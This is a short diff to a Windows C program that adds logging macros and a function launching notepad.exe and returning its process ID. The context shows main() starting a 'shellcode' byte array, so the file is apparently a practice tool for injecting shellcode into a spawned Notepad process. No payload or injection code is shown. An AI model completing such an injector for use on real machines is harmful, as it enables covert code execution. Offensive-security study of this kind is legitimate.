@@ -2,6 +2,48 @@
 #include <Windows.h>
 #include <TlHelp32.h>
 
+#define okay(msg, ...) printf("[+] " msg "\n", ##__VA_ARGS__)
+#define warn(msg, ...) printf("[-] " msg "\n", ##__VA_ARGS__)
+#define info(msg, ...) printf("[i] " msg "\n", ##__VA_ARGS__)
+
+DWORD startNotePad() {
+	DWORD PID = 0;
+	// Start Notepad process and get PID
+	// Path to the Notepad executable
+	const wchar_t* notepadPath = L"C:\\Windows\\System32\\notepad.exe";
+
+	// Create a PROCESS_INFORMATION structure to store process information
+	PROCESS_INFORMATION processInfo;
+
+	// Create a STARTUPINFO structure to specify the startup information for the process
+	STARTUPINFO startupInfo;
+	ZeroMemory(&startupInfo, sizeof(startupInfo));
+	startupInfo.cb = sizeof(startupInfo);
+
+
+	if (CreateProcess(
+		notepadPath,      // Application name (Notepad executable path)
+		NULL,             // Command line
+		NULL,             // Process handle not inheritable
+		NULL,             // Thread handle not inheritable
+		FALSE,            // Set handle inheritance to FALSE
+		0,                // No creation flags
+		NULL,             // Use parent's environment block
+		NULL,             // Use parent's starting directory
+		&startupInfo,     // Pointer to STARTUPINFO structure
+		&processInfo      // Pointer to PROCESS_INFORMATION structure
+	)) {
+		// Notepad started successfully, print its process ID
+		info("Notepad started successfully, PID: %d", processInfo.dwProcessId);
+		PID = processInfo.dwProcessId;
+		return PID;
+	}
+	else {
+		// Error handling if CreateProcess fails
+		warn("CreateProcess failed (%d).", GetLastError());
+		return 0;
+	}
+}
 int main()
 {
 	unsigned char shellcode[] =
